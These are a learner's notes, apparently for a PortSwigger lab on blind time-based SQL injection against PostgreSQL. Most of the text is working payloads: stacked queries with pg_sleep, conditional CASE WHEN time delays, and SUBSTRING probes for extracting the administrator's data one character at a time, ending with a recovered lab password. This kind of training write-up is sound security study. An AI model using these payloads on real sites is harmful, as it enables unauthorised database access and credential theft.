--Name: Blind SQL injection with time delays and information retrieval
--URL: https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
--Level: Medium Time: 10 min
---------------------------------------------------------------------------------

-- Objective: log in as the administrator user. 

-- Cookie name: TrackingId
-- Cookie value: JRyX3o4aOGu50jYI
-- Database type : PostgreSQL
-- table : users
-- columns : username, password
-- username : administrator


SELECT ???? FROM ???? WHERE TrackingId = 'JRyX3o4aOGu50jYI'???--          
-- original --


SELECT ???? FROM ???? WHERE TrackingId = 'JRyX3o4aOGu50jYI'; SELECT pg_sleep(10)--'???--          
-- worked --

SELECT ???? FROM ???? WHERE TrackingId = 'JRyX3o4aOGu50jYI';SELECT+CASE+WHEN+(1=1)+THEN+NULL+ELSE+pg_sleep(5)+END--'???--   No Delay   
SELECT ???? FROM ???? WHERE TrackingId = 'JRyX3o4aOGu50jYI';SELECT+CASE+WHEN+(1=2)+THEN+NULL+ELSE+pg_sleep(5)+END--'???--   Delay  
-- preparing the condition to start checking --


SELECT ???? FROM ???? WHERE TrackingId = 'JRyX3o4aOGu50jYI';SELECT+CASE+WHEN+(SUBSTRING((SELECT+username+FROM+users+WHERE+username='administrator'),1,1)>'z')+THEN+NULL+ELSE+pg_sleep(5)+END--'???--   Delay, meaning it works
-- adding the condition to check the first character of the username --
-- Then we start retreiving charachter by charachter here.





-- Password: f7gg1ve4xvpevi0i8y5w

SELECT ???? FROM ???? WHERE TrackingId = 'JRyX3o4aOGu50jYI'%3BSELECT+CASE+WHEN+(SUBSTRING((SELECT+username+FROM+users+WHERE+username='administrator'),1,1)>'z')+THEN+NULL+ELSE+pg_sleep(5)+END--'???--   No Delay